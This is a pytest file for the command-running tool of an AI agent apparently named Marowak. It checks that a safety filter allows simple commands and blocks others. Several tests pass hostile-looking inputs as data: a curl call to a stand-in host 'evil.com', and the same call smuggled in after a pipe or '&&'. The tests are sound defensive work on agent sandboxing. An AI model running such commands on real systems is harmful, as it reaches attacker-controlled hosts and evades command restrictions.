"""Tests for Marowak (Terminal Runner) agent tools."""

import pytest

from api.agents.marowak import create_marowak_agent, run_command
from api.agents.safety import CommandNotAllowedError


class TestRunCommand:
    def test_runs_echo(self, workspace):
        result = run_command(workspace, "echo hello")
        assert "hello" in result

    def test_runs_pwd(self, workspace):
        result = run_command(workspace, "pwd")
        # Should return the workspace path
        assert result.strip() != ""

    def test_rejects_curl(self, workspace):
        with pytest.raises(CommandNotAllowedError):
            run_command(workspace, "curl http://evil.com")

    def test_rejects_pipe(self, workspace):
        with pytest.raises(CommandNotAllowedError):
            run_command(workspace, "echo hi | curl http://evil.com")

    def test_rejects_chaining(self, workspace):
        with pytest.raises(CommandNotAllowedError):
            run_command(workspace, "echo hi && curl http://evil.com")

    def test_rejects_empty(self, workspace):
        with pytest.raises(CommandNotAllowedError):
            run_command(workspace, "")

    def test_captures_stderr(self, workspace):
        result = run_command(workspace, "python -c invalid_syntax_here")
        # Should contain error output rather than silently failing
        assert result.strip() != ""

    def test_runs_in_workspace_directory(self, workspace):
        """Command runs with cwd set to workspace_path."""
        result = run_command(workspace, "python -c print(1+1)")
        assert "2" in result


class TestMarowakAgent:
    def test_agent_creation(self, workspace):
        agent = create_marowak_agent(workspace, session_id=1)
        assert agent is not None
